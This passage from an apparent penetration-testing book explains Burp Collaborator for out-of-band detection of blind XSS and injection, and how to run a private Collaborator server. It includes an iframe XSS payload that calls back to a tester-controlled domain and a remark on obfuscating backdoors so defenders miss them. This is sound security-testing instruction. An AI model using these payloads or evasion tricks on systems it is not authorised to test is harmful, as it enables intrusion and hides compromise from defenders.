recorded it, and notified us. Our Burp Suite client linked the service interaction reported by Collaborator to a specific request and highlighted it for easy review.</p><p>This was all done automatically in the background. With Collaborator's help, we can cover a large attack surface and find obscure bugs quickly and efficiently.</p></div><div class="section" title="Burp Collaborator client"><div class="titlepage"><div><div><h3 class="title"><a id="ch07lvl3sec08"/>Burp Collaborator client</h3></div></div></div><p>In certain <a id="id349" class="indexterm"/>situations, relying on Burp's Active Scanner to find these issues may not be sufficient. Suppose we may suspect a particular component of the target application is vulnerable to a blind SQL injection or stored XSS attack. </p><p>In order for the exploit to trigger, it would have to be wrapped in some type of encoding or encryption, and passed to the application to be later decoded, or decrypted and executed. Burp's Active Scanner would not be able to confirm this vulnerability because it is not aware of the custom requirements for the payload delivery.</p><p>The good news is that we can still leverage Collaborator to help us identify vulnerabilities in these difficult-to-reach areas of the application. Burp Suite also comes bundled with the Collaborator client, which can generate a number of these unique domains <a id="id350" class="indexterm"/>to be used in a custom Intruder attack.</p><p>The Collaborator client can be launched from the Burp menu:</p><div class="mediaobject"><img src="graphics/B09238_07_21.jpg" alt="Burp Collaborator client"/><div class="caption"><p>Figure 7.21: Launch Collaborator client from the Burp menu</p></div></div><p>To generate unique domains for use in custom payloads, enter the desired number and click <span class="strong"><strong>Copy to clipboard</strong></span>. Burp will add the newline-separated domains to the clipboard for further processing.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note36"/>Note</h3><p>Once you close the Collaborator client window, the domains generated will be invalidated and you may not be able to detect out-of-band service interactions.</p></div></div><div class="mediaobject"><img src="graphics/B09238_07_22.jpg" alt="Burp Collaborator client"/><div class="caption"><p>Figure 7.22: Burp Collaborator client window</p></div></div><p>We can <a id="id351" class="indexterm"/>grab one of these domains and feed it to our custom attack. The application accepts the request but does not respond with any data. Our payload is a simple XSS payload designed to create an <code class="literal">iframe</code> that navigates to the domain generated by the Collaborator client.</p><div class="informalexample"><pre class="programlisting">"&gt;&lt;iframe%20src=[collaborator-domain]/&gt;</pre></div><p>If the application is vulnerable, this exploit will spawn a new HTML <code class="literal">iframe</code>, which will connect back to a server we control, confirming the existence of a vulnerability.</p><div class="mediaobject"><img src="graphics/B09238_07_23.jpg" alt="Burp Collaborator client"/><div class="caption"><p>Figure 7.23: Submitting the Collaborator domain in an XSS payload</p></div></div><p>We hope <a id="id352" class="indexterm"/>that this payload is executed at some point, perhaps when an administrator navigates to the page responsible for handling these requests. If the application is vulnerable, the <code class="literal">iframe</code> will attempt to navigate to the injected URL.</p><p>This has the following side effects:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">A DNS request is made to the <code class="literal">src</code> domain</li><li class="listitem" style="list-style-type: disc">An HTTP request is made to the IP associated with the <code class="literal">src</code> domain</li></ul></div><p>The Collaborator client will poll the server every 60 seconds by default but can be forced to check at any point. If a victim triggers exploit, Collaborator will let us know:</p><div class="mediaobject"><img src="graphics/B09238_07_24.jpg" alt="Burp Collaborator client"/><div class="caption"><p>Figure 7.24: Collaborator client shows service interaction</p></div></div><p>It appears <a id="id353" class="indexterm"/>that the payload was executed successfully and with Collaborator's help, we now have proof.</p></div></div><div class="section" title="Private Collaborator server"><div class="titlepage"><div><div><h2 class="title"><a id="ch07lvl2sec32"/>Private Collaborator server</h2></div></div></div><p>There are <a id="id354" class="indexterm"/>benefits to running our own instance of Collaborator. A private instance is useful for tests where the target cannot <a id="id355" class="indexterm"/>reach the internet, or for the extra-paranoid client who would prefer to take third-parties out of the equation.</p><p>There's also something to be said about stealth: outbound connections to a <a class="ulink" href="http://burpcollaborator.net">burpcollaborator.net</a> domain may raise some eyebrows. A less conspicuous domain may be better suited for some engagements. I realize the domain we're about to use for our private instance, <code class="literal">c2.spider.ml</code>, is not much better, but we'll roll with it for the demo's sake.</p><p>The Collaborator <a id="id356" class="indexterm"/>server has many of the same requirements as the C2 server we set up in the previous chapter. The only difference is the Burp server will run its own services for DNS, HTTP, and SMTP, and we will not need INetSim.</p><p>We have <a id="id357" class="indexterm"/>already delegated control of <code class="literal">c2.spider.ml</code> to our cloud instance on which the Collaborator server will run. The DNS service should be able to respond to all incoming DNS requests for any subdomain belonging to <code class="literal">c2.spider.ml</code>.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note37"/>Note</h3><p>Collaborator can be a bit memory hungry and a micro-cloud instance may not be enough for a production deployment.</p></div></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note38"/>Note</h3><p>The first time you run the Collaborator server, it will prompt you to enter your license in order to perform activation. This value is stored in <code class="literal">~/.java/.userPrefs/burp/prefs.xml</code> so make sure that this file is properly protected and is not world-readable.</p></div></div><p>The Collaborator server is actually built into the Burp Suite attack proxy. We can copy the Burp Suite Professional JAR file and launch it from the command-line with the <code class="literal">--collaborator-server</code> switch:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~/collab# java -jar Burp Suite_pro.jar --collaborator-server
[...]
This version of Burp requires a license key. To continue, please paste your license key below.
<span class="strong"><strong>VGhlcmUgYXJlIHRoZXNlIHR3byB5b3VuZyBmaXNoIHN3aW1taW5nIGFsb25nLCBhbmQgdGhleSBoYXBwZW4gdG8gbWVldCBhbiBvbGRlciBmaXNoIHN3aW1taW5nIHRoZSBvdGhlciB3YXksIHdobyBub2RzIGF0IHRoZW0gYW5kIHNheXMsICJNb3JuaW5nLCBib3lzLCBob3cncyB0aGUgd2F0ZXI/IiBBbmQgdGhlIHR3byB5b3VuZyBmaXNoIHN3aW0gb24gZm9yIGEgYml0LCBhbmQgdGhlbiBldmVudHVhbGx5IG9uZSBvZiB0aGVtIGxvb2tzIG92ZXIgYXQgdGhlIG90aGVyIGFuZCBnb2VzLCAiV2hhdCB0aGUgaGVsbCBpcyB3YXRlcj8i</strong></span>

Burp will now attempt to contact the license server and activate your license. This will require Internet access.
NOTE: license activations are monitored. If you perform too many activations, further activations for this license may be prevented.

Enter preferred activation method (o=online activation; m=manual activation; r=re-enter license key)
o

Your license is successfully installed and activated.</pre></div><p>At this point, the Collaborator server is running with default configuration. We will need to specify <a id="id358" class="indexterm"/>some custom options to get the most out of the private instance. The configuration file is a simple text file in JSON format, with <a id="id359" class="indexterm"/>a few options to specify listening ports, DNS authoritative zones, and SSL configuration options. We can create this file anywhere on disk and reference it later.</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~/collab# cat config.json
{
  "serverDomain":<span class="strong"><strong> "c2.spider.ml",</strong></span>
  "ssl": {
    "hostname":<span class="strong"><strong> "c2.spider.ml"</strong></span>
  },
  "eventCapture": {
    "publicAddress" :<span class="strong"><strong> "35.196.100.89"</strong></span>
  },
  "polling" : {
    "publicAddress" :<span class="strong"><strong> "35.196.100.89",</strong></span>
    "ssl": {
      "hostname" :<span class="strong"><strong> "polling.c2.spider.ml"</strong></span>
    }
  },
  "dns": {
    "interfaces": [{
      "localAddress": "0.0.0.0",
      "publicAddress":<span class="strong"><strong> "35.196.100.89"</strong></span>
    }]
  },
  "logLevel": "DEBUG"
}</pre></div><p>You'll notice we had to specify the domain we'll be using along with our public IP address. The log level is set to <code class="literal">DEBUG</code> until we can confirm the server is functioning properly.</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@spider-c2-1:~/collab# java -jar Burp Suite_pro.jar --collaborator-server --collaborator-config=config.json</strong></span>
<span class="strong"><strong>[...] : Using configuration file config.json</strong></span>
<span class="strong"><strong>[...] : Listening for DNS on 0.0.0.0:53</strong></span>
<span class="strong"><strong>[...] : Listening for SMTP on 25</strong></span>
<span class="strong"><strong>[...] : Listening for HTTP on 80</strong></span>
<span class="strong"><strong>[...] : Listening for SMTP on 587</strong></span>
<span class="strong"><strong>[...] : Listening for HTTPS on 443</strong></span>
<span class="strong"><strong>[...] : Listening for SMTPS on 465</strong></span>
</pre></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note39"/>Note</h3><p>It is a good idea to filter incoming traffic to these ports and whitelist your and your target's external IPs only.</p></div></div><p>Now that <a id="id360" class="indexterm"/>the server is online, we can <a id="id361" class="indexterm"/>modify the <span class="strong"><strong>Project options</strong></span> and point to our private server, <code class="literal">c2.spider.ml</code>.</p><div class="mediaobject"><img src="graphics/B09238_07_25.jpg" alt="Private Collaborator server"/><div class="caption"><p>Figure 7.25: Private Collaborator server configuration</p></div></div><p>Using <a id="id362" class="indexterm"/>the <span class="strong"><strong>Run health check…</strong></span> button, we should be <a id="id363" class="indexterm"/>able to force some interaction with the new Collaborator server:</p><div class="mediaobject"><img src="graphics/B09238_07_26.jpg" alt="Private Collaborator server"/><div class="caption"><p>Figure 7.26: Burp Collaborator health check</p></div></div><p>The server <a id="id364" class="indexterm"/>console log will reflect our <a id="id365" class="indexterm"/>connection attempts:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~/collab# java -jar Burp Suite_pro.jar --collaborator-server --collaborator-config=config.json
[...] : Using configuration file config.json
[...] : Listening for DNS on 0.0.0.0:53
[...] : Listening for SMTP on 25
[...] : Listening for HTTP on 80
[...] : Listening for SMTP on 587
[...] : Listening for HTTPS on 443
[...] : Listening for SMTPS on 465

<span class="strong"><strong>[...] : Received DNS </strong></span>query from [74.125.19.6] for<span class="strong"><strong> [t0u55lee1aba8o6jwbm4kkgfm6sj62qkunj.c2.spider.ml] </strong></span>containing interaction IDs:<span class="strong"><strong> t0u55lee1aba8o6jwbm4kkgfm6sj62qkunj</strong></span>
[...] : Received<span class="strong"><strong> HTTP </strong></span>request from [173.239.208.17] for [/] containing interaction IDs: t0u55lee1aba8o6jwbm4kkgfm6sj62qkunj
[...] : Received<span class="strong"><strong> HTTPS </strong></span>request from [173.239.208.17] for [/] containing interaction IDs: t0u55lee1aba8o6jwbm4kkgfm6sj62qkunj</pre></div><p>The SMTP and SMTPS checks may fail depending on your ISP's firewall, but enterprise clients should be able to reach it. The important part is the DNS configuration. If the target can resolve the randomly generated subdomain for <code class="literal">c2.spider.ml</code>, they should be able <a id="id366" class="indexterm"/>to connect outbound if no other egress filtering takes place.</p><p>You'll also <a id="id367" class="indexterm"/>notice that the enforced HTTPS connection failed as well. This is because by default, Collaborator uses a self-signed wildcard certificate to handle encrypted HTTP connections.</p><p>To get around this issue for targets whose trusted root certificate authorities we don't control, we'd have to install a certificate signed by a public certificate authority.</p><p>The <code class="literal">config.json</code> would be modified slightly to point Collaborator to this certificate and its private key:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@spider-c2-1:~/collab# cat config.json</strong></span>
<span class="strong"><strong>{</strong></span>
<span class="strong"><strong>  "serverDomain": "c2.spider.ml",</strong></span>
<span class="strong"><strong>  "ssl": {</strong></span>
<span class="strong"><strong>    "hostname": "c2.spider.ml"</strong></span>
<span class="strong"><strong>  },</strong></span>
<span class="strong"><strong>  "eventCapture": {</strong></span>
<span class="strong"><strong>    "publicAddress" : "35.196.100.89",</strong></span>
<span class="strong"><strong>    "ssl": {</strong></span>
<span class="strong"><strong>      "certificateFiles" : [</strong></span>
<span class="strong"><strong>        "keys/wildcard.c2.spider.ml.key.pkcs8",</strong></span>
<span class="strong"><strong>        "keys/wildcard.c2.spider.ml.crt",</strong></span>
<span class="strong"><strong>        "keys/intermediate.crt"</strong></span>
<span class="strong"><strong>      ]</strong></span>
<span class="strong"><strong>    }</strong></span>
<span class="strong"><strong>  },</strong></span>
<span class="strong"><strong>  "polling" : {</strong></span>
<span class="strong"><strong>    "publicAddress" : "35.196.100.89",</strong></span>
<span class="strong"><strong>    "ssl": {</strong></span>
<span class="strong"><strong>      "hostname" : "polling.c2.spider.ml"</strong></span>
<span class="strong"><strong>    }</strong></span>
<span class="strong"><strong>  },</strong></span>
<span class="strong"><strong>  "dns": {</strong></span>
<span class="strong"><strong>    "interfaces": [{</strong></span>
<span class="strong"><strong>      "localAddress": "0.0.0.0",</strong></span>
<span class="strong"><strong>      "publicAddress": "35.196.100.89"</strong></span>
<span class="strong"><strong>    }]</strong></span>
<span class="strong"><strong>  },</strong></span>
<span class="strong"><strong>  "logLevel": "DEBUG"</strong></span>
<span class="strong"><strong>}</strong></span>
</pre></div><p>In a <a id="id368" class="indexterm"/>subdirectory called <code class="literal">keys</code>, we'd have to drop the PKCS 8-encoded private key, the corresponding publicly signed certificate, and <a id="id369" class="indexterm"/>any intermediate authority certificates we may need to sever in order for the certificate chain to validate. In the previous chapter, we were able to generate certificates for our C2 domain, which we can use and play here as well.</p></div></div>
<div class="section" title="Summary"><div class="titlepage"><div><div><h1 class="title"><a id="ch07lvl1sec48"/>Summary</h1></div></div></div><p>This chapter showcased a number of tools and techniques that work together to make an otherwise-tedious part of the engagement seamless. Burp Suite, or the free alternative OWASP ZAP, both provide ways to extend functionality and make quick work of repetitive tasks.</p><p>We've also looked at an easy way to obfuscate code that may end up on a target system. When dropping a custom shell on a server, it's a good idea to hide its true function. A passing blue teamer may not look twice if the code looks overly complex. We've used tools to quickly transform our generated backdoor into a less conspicuous output.</p><p>Finally, building on the previous chapter's out-of-band vulnerability discovery techniques, we leveraged Burp's Collaborator server to streamline the whole process. Collaborator is an indispensable tool and, if possible, should always be enabled when attacking web applications. In the next chapter, we will switch gears and look at exploiting an interesting class of vulnerabilities related to object serialization.</p><p>In the next chapter, we will switch gears and look at an increasingly common vulnerability type, which could be devastating if exploited successfully. Deserialization attacks are here to stay and we will dig a bit deeper into how they work and how to exploit them.</p></div></body></html>